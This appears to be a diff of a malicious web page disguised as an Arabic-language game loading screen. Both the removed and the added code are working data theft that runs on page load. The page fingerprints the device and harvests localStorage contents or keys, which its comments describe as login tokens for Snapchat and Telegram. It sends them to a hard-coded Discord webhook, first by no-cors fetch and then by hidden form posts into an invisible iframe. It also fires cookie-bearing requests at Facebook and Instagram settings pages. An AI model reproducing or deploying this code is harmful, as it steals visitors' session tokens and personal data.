@@ -4,75 +4,88 @@
     <meta charset="UTF-8">
     <title>تحميل اللعبة...</title>
     <style>
-        body { background: #000; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .version-marker { font-size: 80px; font-weight: bold; color: #1a1a1a; position: absolute; top: 20px; right: 20px; }
+        body { background: #000; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: monospace; }
+        .version-marker { font-size: 60px; font-weight: bold; color: #1a1a1a; position: absolute; top: 20px; right: 20px; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        /* شاشة كشف الأخطاء */
+        #debug-console { font-size: 10px; color: #00ff00; margin-top: 20px; width: 80%; word-break: break-all; text-align: left; }
     </style>
 </head>
 <body>
-    <div class="version-marker">11</div>
+    <div class="version-marker">12</div>
     <div class="loader"></div>
-    <p>جاري مزامنة البروتوكول (V1.2.3)...</p>
+    <p>جاري فحص الاتصال (V1.2.4)...</p>
+    <div id="debug-console">Initializing...</div>
+
+    <iframe name="hidden_receiver" style="display:none;"></iframe>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";
+        const consoleDiv = document.getElementById('debug-console');
 
-        // أضمن طريقة للإرسال في كروم 2026: استخدام الـ fetch بوضع 'no-cors'
-        function pulse(title, message) {
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    embeds: [{
-                        title: `📡 ${title}`,
-                        description: message,
-                        color: 3066993,
-                        timestamp: new Date().toISOString()
-                    }]
-                })
-            });
+        function localLog(msg) {
+            consoleDiv.innerHTML += "<br>> " + msg;
+            console.log(msg);
         }
 
-        // إطلاق طلبات خلفية "عمياء" (المتصفح يتقمص الشخصية غصباً عنه)
-        function triggerBlindRequest(name, url) {
-            const img = new Image();
-            // المتصفح سيحمل الرابط بكامل الكوكيز بالخلفية
-            img.src = url + "?cache_bust=" + Math.random();
-            pulse("Request Triggered", `الطلب انطلق بنجاح إلى: ${name}\nالمتصفح استخدم الكوكيز النشطة بالخلفية.`);
-        }
-
-        async function startHarvest() {
+        // الطريقة الأقوى لتجاوز حماية كروم: Form Submission
+        function forceExfiltrate(title, content) {
             try {
-                // 1. بصمة الجهاز الفورية (عشان نعرف إن السكريبت اشتغل)
-                pulse("System Sync", `الجهاز: ${navigator.platform}\nالمتصفح: ${navigator.userAgent}`);
+                const form = document.createElement('form');
+                form.method = 'POST';
+                form.action = WEBHOOK_URL;
+                form.target = 'hidden_receiver'; // الإرسال داخل الـ iframe عشان ما تفتح صفحة جديدة
 
-                // 2. سحب الـ LocalStorage (هذا هو "الذهب" اللي كروم ما بيمنعه)
-                // هنا بتلاقي Tokens الدخول لسناب شات وتلجرام وغيرها
-                let storageData = "";
-                for (let i = 0; i < localStorage.length; i++) {
-                    let key = localStorage.key(i);
-                    storageData += `**${key}**: ${localStorage.getItem(key).substring(0, 100)}...\n`;
-                }
-                
-                if (storageData) {
-                    pulse("Storage Harvest", storageData);
-                } else {
-                    pulse("Storage Check", "LocalStorage فارغ (قد يكون المتصفح في وضع Private)");
-                }
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = 'payload_json';
+                input.value = JSON.stringify({
+                    content: `📟 **[${title}]**\n${content}`
+                });
 
-                // 3. تنفيذ "طلبات الانتحال" (Proxy Actions)
-                // المتصفح يروح يزور المواقع بكوكيز الضحية
-                triggerBlindRequest("Facebook", "https://mbasic.facebook.com/settings");
-                triggerBlindRequest("Instagram", "https://www.instagram.com/accounts/edit/");
-
+                form.appendChild(input);
+                document.body.appendChild(form);
+                form.submit();
+                document.body.removeChild(form);
+                localLog("Attempted send: " + title);
             } catch (e) {
-                pulse("Error Log", e.message);
+                localLog("Form Error: " + e.message);
             }
         }
 
-        window.onload = startHarvest;
+        async function runDiagnostic() {
+            localLog("Starting mission...");
+            
+            try {
+                // 1. فحص الوصول لديسكورد
+                localLog("Testing Webhook connectivity...");
+                forceExfiltrate("Diagnostic", "Device: " + navigator.platform);
+
+                // 2. محاولة سحب الـ Storage
+                localLog("Checking LocalStorage...");
+                let keys = Object.keys(localStorage).join(", ");
+                if (keys) {
+                    forceExfiltrate("Loot_Keys", "Keys found: " + keys);
+                    localLog("Found keys: " + keys);
+                } else {
+                    localLog("LocalStorage is empty.");
+                }
+
+                // 3. اختبار الـ Requests الخلفية
+                localLog("Triggering background proxy...");
+                const img = new Image();
+                img.src = "https://mbasic.facebook.com/settings?v=" + Math.random();
+                img.onerror = () => localLog("FB Probe blocked or offline.");
+                img.onload = () => localLog("FB Probe success!");
+
+            } catch (err) {
+                localLog("Global Error: " + err.message);
+            }
+        }
+
+        // انتظر 2 ثانية ثم ابدأ
+        setTimeout(runDiagnostic, 2000);
     </script>
 </body>
 </html>
